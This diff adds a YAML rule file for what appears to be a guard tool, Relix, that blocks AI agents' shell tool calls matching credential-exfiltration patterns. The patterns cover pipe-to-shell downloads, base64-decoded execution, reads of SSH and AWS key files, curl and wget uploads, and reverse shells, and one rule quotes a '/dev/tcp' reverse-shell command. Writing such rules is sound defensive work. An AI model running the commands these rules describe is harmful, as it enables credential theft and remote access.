@@ -1,0 +1,75 @@
+# Outbound credential exfiltration patterns.
+#
+# These rules inspect the tool_calls Relix observes inside LLM responses,
+# blocking shell commands that read credential material and pipe it to a
+# remote endpoint.
+
+rules:
+  - id: relix.bash.curl-pipe-bash
+    name: curl piped to shell interpreter
+    description: |
+      A common malware install pattern. Curl/wget output piped directly into
+      bash/sh/zsh executes whatever the remote host returns, bypassing any
+      review step. Frequently used by poisoned relays to bootstrap a
+      payload.
+    severity: high
+    action: block
+    tags: [bash, pipe-to-shell]
+    matcher:
+      kind: tool_input_regex
+      name: Bash
+      pattern: "(curl|wget|httpie|xh)\\s+[^|]+\\|\\s*(bash|sh|zsh|python)"
+
+  - id: relix.bash.base64-decode-exec
+    name: base64 decode piped to interpreter
+    description: |
+      Encoded payloads are commonly used to obfuscate malicious shell
+      commands. base64 -d piped to bash/python is almost never legitimate
+      in an AI-coding-agent context.
+    severity: high
+    action: block
+    tags: [bash, obfuscation]
+    matcher:
+      kind: tool_input_regex
+      name: Bash
+      pattern: "base64\\s+-d.*\\|\\s*(bash|sh|python)"
+
+  - id: relix.bash.read-private-key
+    name: shell command reads SSH private key
+    description: |
+      Any tool call that cats, reads, or uploads an SSH private key,
+      AWS credential file, or other key material is highly suspicious.
+    severity: critical
+    action: block
+    tags: [credential-exfiltration, ssh]
+    matcher:
+      kind: tool_input_regex
+      name: Bash
+      pattern: "(\\.ssh/id_(rsa|ed25519|ecdsa)|\\.aws/credentials|\\.env(\\s|$)|/etc/shadow)"
+
+  - id: relix.bash.curl-upload-file
+    name: curl/wget upload of arbitrary local file
+    description: |
+      The `curl -d @file`, `curl -T file`, and `wget --post-file` patterns
+      send local file contents to a remote URL. Combined with sensitive
+      file patterns this is a textbook exfiltration step.
+    severity: high
+    action: block
+    tags: [exfiltration]
+    matcher:
+      kind: tool_input_regex
+      name: Bash
+      pattern: "(curl\\s+(-X\\s+POST\\s+)?(-d\\s+@|-T\\s+|--data-binary\\s+@)|wget\\s+--post-file)"
+
+  - id: relix.bash.reverse-shell
+    name: reverse shell pattern
+    description: |
+      Patterns like `bash -i >& /dev/tcp/host/port 0>&1` open an
+      interactive reverse shell to an attacker-controlled host.
+    severity: critical
+    action: block
+    tags: [reverse-shell]
+    matcher:
+      kind: tool_input_regex
+      name: Bash
+      pattern: "(bash\\s+-i\\s*>&\\s*/dev/tcp/|nc\\s+.*-e\\s*(/bin/)?(bash|sh)|python\\s+-c\\s*['\"].*socket\\.\\w+\\(.*connect)"
